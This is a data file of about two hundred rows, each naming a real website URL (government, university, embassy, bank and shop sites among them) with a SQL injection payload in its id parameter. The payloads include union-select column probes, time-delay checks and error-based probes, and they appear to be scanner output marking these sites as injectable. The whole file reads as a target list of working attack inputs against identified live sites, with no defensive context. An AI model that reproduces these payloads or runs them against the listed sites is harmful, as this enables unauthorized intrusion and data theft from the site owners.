+457,sql,http://www.ictet.org/list%2Bmember.php?id=1' UNION ALL SELECT NULL-- lmXC
+459,sql,http://www.unifr.ch/form/iaupe_32/view.php?id=1%' ORDER BY 1-- KBQw
+460,sql,http://www.millennium-tech.net/serviceInfo.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bNBY
+461,sql,http://www.jdcaravan.com/store.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+462,sql,https://www.nationaloil.co.ke/site/2.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bDCI
+463,sql,https://www.crocodile.com.hk/en/webpage.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fmtt
+464,sql,http://www.icona.info/content.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+465,sql,http://www1.clermont.inra.fr/wq/index.php?id=1') UNION ALL SELECT NULL,NULL-- utDw
+466,sql,http://www.shorttrackonline.info/web-tv.php?id=1') AND SLEEP(5) AND ('GJyr'='GJyr
+468,sql,http://safring.adu.org.za/content.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PViD
+469,sql,http://www.phpsimplicity.com/tips.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+471,sql,https://ticketpay.jp/support_page.php?id=1) AND SLEEP(5) AND (7824=7824
+472,sql,https://www.aaaauto.eu/en/users.php?id=1;WAITFOR DELAY '0:0:5'--
+473,sql,http://www.mvpvo.ru/inner.php?id=1%';WAITFOR DELAY '0:0:5'--
+475,sql,https://www.law.cuhk.edu.hk/en/people/info.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+477,sql,https://www.cmu.ac.th/en/engaboutcmu.php?id=1' UNION ALL SELECT NULL,NULL-- ViPr
+478,sql,https://www.indianembassythimphu.bt/pages.php?id=1 AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5)-- jIbI
+481,sql,https://www.tonfly.com/helmet.php?id=1 AND 3611=3611-- SJqY
+482,sql,http://www.polosub.com/scheda_mute_en.php?id=1') ORDER BY 1-- tslS
+483,sql,https://xn--80aaejurlecbd2k8c.xn--p1ai/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rvrn
+484,sql,http://www.sinohytec.com/en/page.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL-- iRLI
+485,sql,https://friendsofscience.org/index.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+486,sql,http://www.blessgans.de/index.php?id=1') UNION ALL SELECT NULL,NULL-- utDw
+487,sql,http://www.zentrumexil.at/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- lXro
+488,sql,https://www.laboshop.com/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rekn
+489,sql,http://www.stalmax.com/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PViD
+490,sql,https://rational.org/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+491,sql,https://library.geraldika.ru/book.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+492,sql,http://www.redtory.com.cn/english/about.php?id=1 UNION ALL SELECT NULL-- uRNf
+493,sql,http://www.innofader.com/products.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fmtt
+494,sql,http://www.freescience.info/books.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- nBvv
+495,sql,http://www.treeviewthai.com/service_en.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+496,sql,http://www.ghanatimber.org/certification_details.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+498,sql,http://venusita-moda.com/article.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- spUE
+499,sql,http://byglearning.co.uk/mrcrsc-lms/course/category.php?id=1') UNION ALL SELECT NULL-- eEGL
+500,sql,http://www.mcdonalds.co.jp/quality/allergy_Nutrition/nutrient2.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- qwPK
+501,sql,http://www.energyquest.com.au/reports.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+502,sql,http://www.rideitmoto.com/products_list1.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)
+504,sql,http://www.tdap.gov.pk/trade-bodies.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+505,sql,https://www.ileswastesystems.co.uk/index.php?id=1');WAITFOR DELAY '0:0:5'--
+507,sql,https://mahara.org/group/view.php?id=1' UNION ALL SELECT NULL,NULL,NULL-- hhTM
+508,sql,http://www.palavrion.com/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NXUF
+510,sql,https://www.indianembassy.de/pages.php?id=1' ORDER BY 1-- Hgvf
+511,sql,https://www.dt-shop.com/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wXih
+512,sql,http://www.gulf1bank.com/page.php?id=1' AND 7019=2399 AND 'bmfB'='bmfB
+513,sql,http://www.nsb.gov.bt/publication/publications.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PViD
+514,sql,http://www.cubana.ru/about.php?id=1%' UNION ALL SELECT NULL,NULL-- DONg
+515,sql,http://nursing.flinders.edu.au/students/studyaids/drugcalculations/page.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IKMj
+516,sql,http://outbacklabs.com/listing.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cgcm
+517,sql,http://www.viparspectra.com/category.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+518,sql,http://silverstateenergy.org/announcement.php?id=1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+519,sql,https://edlinked.soe.waikato.ac.nz/research/journal/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- qwPK
+520,sql,http://www.ausmip.org/main.php?id=1 AND SLEEP(5)
+521,sql,http://www.realisticky.cz/ucebnice.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+522,sql,http://www.pyme.go.cr/cuadro1.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+523,sql,http://www.hrpub.org/journals/jour_info.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+524,sql,http://www.ipicshopping.co.za/shopping_centre.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- dLhL
+525,sql,http://biblia.deon.pl/rozdzial.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- GgCj
+527,sql,http://www.vaughanchinese.com/new/websites/content.php?id=1%' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND '%'='
+528,sql,http://alphaonenow.org/info.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PViD
+529,sql,https://polenow.com/login.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- fKpc
+531,sql,http://www.justiceforsergei.com/video.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- TLHU
+532,sql,http://www.mujahidkamran.com/books.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CEEX
+533,sql,https://www.anglesgallery.com/ssp_director/artistgallery.php?id=1 ORDER BY 1-- lAea
+534,sql,http://identitiesjournal.edu.mk/cat.php?id=1")))(,,)')
+535,sql,http://www.microfinance.lk/member_profile.php?id=1%' UNION ALL SELECT NULL,NULL,NULL-- Lunn
+536,sql,http://www.aphesa.com/downloads/download2.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))
+537,sql,http://www.microatena.it/biblioteca.php?id=1 ORDER BY 4721-- gPsZ
+538,sql,https://www.safari-hotels.com/site/3.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NXUF
+539,sql,http://dancingbetty.com/product-list.php?id=5433-5432
+540,sql,http://www.terraclean.net/product.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+541,sql,http://www.gainwelltravel.com/cms.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- itKr
+542,sql,http://www.morini.ch/product_det.php?id=1 AND 3611=3611
+543,sql,http://www.renexpo-bih.com/index.php?id=1' ORDER BY 6555-- CoTc
+545,sql,https://learning.thefa.com/totara/program/view.php?id=1%';WAITFOR DELAY '0:0:5'--
+546,sql,http://www.austinminiatures.com/products.php?id=5433-5432
+547,sql,http://kpd1.ru/catalog.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cgcm
+548,sql,http://www.habibitours.com/cat.php?id=(SELECT (CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (2394=2394) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)))
+549,sql,http://www.daesgroup.com/region.php?id=1) WAITFOR DELAY '0:0:5' AND (5754=5754
+550,sql,http://www.ventrilo.com/dlprod.php?id=1') AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND ('bARY'='bARY
+551,sql,http://www.system16.com/museum.php?id=(SELECT CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5838=5838) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113))
+552,sql,http://www.stabilizationandtransition.org/Bio.php?id=1);WAITFOR DELAY '0:0:5'--
+553,sql,http://www.turbaza-volgograd.ru/viewbase.php?id=1' AND SLEEP(5) AND 'itCe'='itCe
+554,sql,http://www.sunxtender.com/solarbattery.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))-- Qmvu
+555,sql,http://www.cmt-net.org/index.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+556,sql,http://www.cultuurwijzerapeldoorn.nl/cultuurmenu.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- bDCI
+557,sql,http://www.indiainfrastructure.com/shopping_cart.php?id=1' ORDER BY 1-- Hgvf
+558,sql,https://www.kianjoocan.com.my/index.php?id=1' UNION ALL SELECT NULL-- lmXC
+561,sql,http://ska3.ru/bummi.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aPje
+562,sql,http://www.caosciotocounty.org/template.php?id=1%' UNION ALL SELECT NULL,NULL,NULL-- Lunn
+564,sql,http://www.askewsfoods.com/stores.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rvrn
+565,sql,http://www.firstinmichigan.org/stream.php?id=1');SELECT PG_SLEEP(5)--
+566,sql,http://boywhofell.com/index.php?id=1 AND 3611=3611
+567,sql,https://www.arabculturefund.org/projects/project.php?id=1%' AND 2404=6511 AND '%'='
+568,sql,https://www.zobodat.at/publikation_series.php?id=1') ORDER BY 4722-- epns
+569,sql,http://stfranciscountyar.org/page.php?id=1') AND 3611=3611 AND ('xpHU'='xpHU
+570,sql,http://www.harvestlink.com/productsDia.php?id=1.8ChSI
+571,sql,http://www.indiannumismatics.com/products.php?id=1' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND 'MGRK'='MGRK
+572,sql,http://www.integral-eu.com/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gXRN
+573,sql,http://www.howtostudy.org/resources_skill.php?id=1) AND 5836=4675 AND (5312=5312
+574,sql,http://www.prazskamuzejninoc.cz/2017/clanek.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mqyP
+576,sql,http://netintel.ru/index.php?id=1%' AND 2404=6511 AND '%'='
+577,sql,http://www.shortrifles.com/configuration.php?id=1') AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND ('mQhu'='mQhu
+579,sql,http://www.atmarine.fi/index.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL-- atbf
+580,sql,http://www.marsfigures.com/main.php?id=1 ORDER BY 4721-- gPsZ
+581,sql,http://www.rysslandsresor.se/index.php?id=1) WAITFOR DELAY '0:0:5' AND (5754=5754
+582,sql,https://www.ecabank.com/home/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- WGMa
+583,sql,http://bram.smartelectronix.com/plugins.php?id=1) ORDER BY 1-- zRhc
+584,sql,http://www.gardenfarmgolf.com/en_locations.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+585,sql,http://orgia.ru/about.php?id=1) AND 6592=(SELECT 6592 FROM PG_SLEEP(5)) AND (2513=2513
+586,sql,http://www.goafilms.com/location.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))-- sFCM
+587,sql,http://learnonline.health.nz/course/category.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NonP
+588,sql,http://www.stasy.gr/index.php?id=1') UNION ALL SELECT NULL-- eEGL
+589,sql,https://malffb.gov.vu/index.php?id=1%' ORDER BY 1-- KBQw
+590,sql,http://njsfwc.org/projects.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uqAC
+591,sql,http://www.krao.ru/cd-item.php?id=1') ORDER BY 1-- tslS
+592,sql,http://www.ulagos.cl/contenido03.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+593,sql,https://wciom.ru/index.php?id=1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BuTs
+594,sql,http://www.icehalo.ca/products.php?id=1') AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND ('mQhu'='mQhu
+595,sql,http://www.vittoria-shoes.com/prodotto.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- NXUF
+596,sql,http://mkogan.com/duty.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+597,sql,https://koreamed.org/JournalVolume.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zDon
+598,sql,http://www.skytraktravel.com/services.php?id=1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+599,sql,http://www.uba.ar/academicos/uba21/contenidos.php?id=1%' ORDER BY 7815-- mzUV
+600,sql,http://www.isconshanghai.org/web/page.php?id=1'NKZqCS<'">bIRAbA
+601,sql,https://www.id.ee/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+603,sql,http://pastelspace.com/collection.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DxvE
+604,sql,https://www.sjs.org.hk/en/services/services.php?id=(SELECT (CASE WHEN (9362=8798) THEN 9362 ELSE 9362*(SELECT 9362 FROM INFORMATION_SCHEMA.PLUGINS) END))
+605,sql,http://maximaaa.com/mform/view.php?id=1%' AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND '%'='
+606,sql,http://www.echmb.com/about_details.php?id=1) AND 3611=3611 AND (5554=5554
+607,sql,https://toxtown.nlm.nih.gov/text_version/chemicals.php?id=1') AND 7457=2191 AND ('iHjE'='iHjE
+608,sql,http://www.med.muni.cz/index.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hrdu
+609,sql,http://len-zoloto.ru/index.php?id=1'NKZqCS<'">bIRAbA
+611,sql,http://www.nordiqc.org/epitope.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+612,sql,http://meninositu.com.br/galeria/album.php?id=1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+613,sql,https://www.nttgroup.co.za/proc/dealer_detail.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- TLHU
+614,sql,http://www.hold.com.tw/product.php?id=1;SELECT PG_SLEEP(5)--
+615,sql,http://www.catsg.org/index.php?id=1') ORDER BY 1-- tslS
+616,sql,http://www.theurbanrange.com/poet.php?id=1%' AND 3611=3611 AND '%'='
+617,sql,http://www.markzaid.com/biography.php?id=1') UNION ALL SELECT NULL,NULL,NULL-- SOSW
+618,sql,http://www.markdrum.it/product_detail.php?id=1) UNION ALL SELECT NULL-- fqfI
+619,sql,http://www.madisonpac.com/key_details.php?id=1' AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND 'VCNg'='VCNg
+620,sql,http://pyb.co.uk/cakes-detail.php?id=1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+621,sql,http://www.dengy-vsem.ru/prokrizis_vid.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+622,sql,http://one-thebrand.com/cart.php?id=1 UNION ALL SELECT NULL,NULL-- ctvb
+623,sql,https://www.studyastronomy.com/courses.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- qwPK
+624,sql,http://kyoukaigun.jp/visit/detail.php?id=1%' WAITFOR DELAY '0:0:5' AND '%'='
+625,sql,http://www.traditionalcottages.gr/page.php?id=1' AND 3611=3611 AND 'oygD'='oygD
+626,sql,https://primes.utm.edu/top20/page.php?id=1 AND 9533 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9533=9533) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)))
+627,sql,http://www.strategictransitions.com/productDetail.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cgcm
+628,sql,http://www.signsinthecity.net/info.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gXRN
+629,sql,http://www.wsid.info/mod/page/view.php?id=(SELECT (CASE WHEN (9362=8798) THEN 9362 ELSE 9362*(SELECT 9362 FROM INFORMATION_SCHEMA.PLUGINS) END))
+630,sql,http://www.walpax.com.br/beachresorts.php?id=1) AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC) AND (9963=9963
+632,sql,http://www.czga.ro/pagina.php?id=1 ORDER BY 1-- kzEn
+633,sql,http://victorhospital.com/services.php?id=1' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JKvn'='JKvn
+634,sql,http://www.hrvatskonumizmatickodrustvo.hr/index.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)
+635,sql,http://www.medistock.fr/en/catalogue.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+636,sql,http://www.tunesoman.com/product.php?id=1%' ORDER BY 1-- KBQw
+637,sql,https://www.agencevu.com/photographers/photographer.php?id=1) AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6121=6121
+638,sql,http://xn--90abdeg4afamkcabfvi7a8q.xn--p1ai/page.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BMLy
+639,sql,https://www.becker-international.com/index.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)-- bfCW
+640,sql,http://www.mcfolsom.com/page.php?id=1 AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL)
+641,sql,http://www.world-art.ru/people.php?id=1 AND 6592=(SELECT 6592 FROM PG_SLEEP(5))
+642,sql,http://xn--n1addli.xn--p1ai/index.php?id=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CEEX
+643,sql,http://www.wenggroup.com/product.php?id=1%' UNION ALL SELECT NULL-- rJyU
+644,sql,https://www.cathouseonthekings.com/video/webcam.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JiPD
+645,sql,http://www.pacific-textiles.com/businesses_facilities.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+646,sql,http://www.accessibleireland.com/category.php?id=1') WAITFOR DELAY '0:0:5' AND ('RIHg'='RIHg
+647,sql,http://www.vaganova.ru/page.php?id=1 UNION ALL SELECT NULL-- jscU
+648,sql,http://vill.hakuba.nagano.jp/livecam/livecamera.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NonP
+649,sql,http://www.nagarapro.co.jp/top/artist/artist.php?id=(SELECT CONCAT(0x71766a6271,(SELECT (ELT(3360=3360,1))),0x7171717871))
+650,sql,http://www.nhf.org.bd/aboutus.php?id=1 AND 7622=CAST((CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (7622=7622) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)) AS NUMERIC)-- VWJB
+651,sql,http://www.radimpex.rs/download.php?id=1%';WAITFOR DELAY '0:0:5'--
+652,sql,https://pubgshowcase.com/containers.php?id=1%' AND 4249=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(106)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (4249=4249) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(113)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
+653,sql,http://www.seehydropower.eu/download_tools/details.php?id=1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- IshX
+654,sql,https://unite.ut.ee/posts.php?id=1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(106)||CHR(102)||CHR(83),5) FROM DUAL--
+655,sql,http://www.arabterm.org/index.php?id=1') AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('DVsm'='DVsm
+656,sql,https://www.forum-pianoteq.com/viewforum.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- rjiF
+657,sql,http://www.yitechnology.com/support-faq.php?id=1%' AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='
+658,sql,http://www.brahmos.com/content.php?id=1');WAITFOR DELAY '0:0:5'--
+659,sql,https://www.flapjackfunds.com/program.php?id=1 ORDER BY 4721-- gPsZ
+660,sql,http://corp.toei-anim.co.jp/en/film/pickup.php?id=1 ORDER BY 1-- kzEn
+662,sql,http://www.iias-trieste-maribor.eu/index.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- mqyP
+663,sql,http://www.m-e-l.fr/fiche-education-artistique.php?id=1' AND 9940=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(111)||CHR(115)||CHR(104),5) AND 'BOxx'='BOxx
+664,sql,http://www.rancinan.com/official/photos.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- fKpc
+666,sql,http://www.mherc.mb.ca/page.php?id=6787
+667,sql,http://molvica.org/vesti_content.php?id=1' UNION ALL SELECT NULL,NULL,NULL,NULL-- iRLI
+668,sql,http://www.dreamville-bg.com/ru/complex.php?id=1 AND (SELECT 9697 FROM(SELECT COUNT(*),CONCAT(0x71766a6271,(SELECT (ELT(9697=9697,1))),0x7171717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+669,sql,http://www.thespastudios.com/p.php?id=1;SELECT PG_SLEEP(5)--
